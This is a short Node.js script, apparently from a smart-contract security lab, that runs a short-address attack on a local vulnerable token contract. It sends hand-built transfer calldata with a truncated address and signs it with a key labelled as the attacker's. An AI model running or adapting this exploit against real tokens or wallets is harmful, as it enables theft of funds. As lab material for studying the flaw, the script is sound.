// js-scripts/short_address_attack.js

const { Web3 } = require('web3');
const web3 = new Web3('http://localhost:8545'); // Or your RPC URL

const vulnerableTokenABI = [{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"balanceOf","inputs":[{"name":"_owner","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"balances","inputs":[{"name":"","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"transfer","inputs":[{"name":"_to","type":"address","internalType":"address"},{"name":"_amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}];
const vulnerableTokenAddress = '0x5FbDB2315678afecb367f032d93F642f64180aa3';

const account = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'; // Attacker's private key

const vulnerableToken = new web3.eth.Contract(vulnerableTokenABI, vulnerableTokenAddress);

async function simulateAttack() {
    const shortAddress = '0x3bdde1e9fbaef2579dd63e2abbf0be445ab93f'; // 19 bytes address
    const amount = web3.utils.toHex(web3.utils.toWei('1', 'ether'));

    const methodSignature = web3.utils.sha3('transfer(address,uint256)').substring(0, 10);
    const paddedAddress = shortAddress.substring(2).padEnd(64, '0');
    const data = methodSignature + paddedAddress + amount.substring(2);

    const gasPrice = await web3.eth.getGasPrice();
    const gasLimit = 100000;

    const tx = {
        from: account,
        to: vulnerableTokenAddress,
        gas: gasLimit,
        gasPrice: gasPrice,
        data: data
    };

    const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

    // console.log('Transaction Hash:', receipt.transactionHash);
    // console.log('Attack executed, check balances for unexpected outcomes.');
}

simulateAttack().catch(console.error);
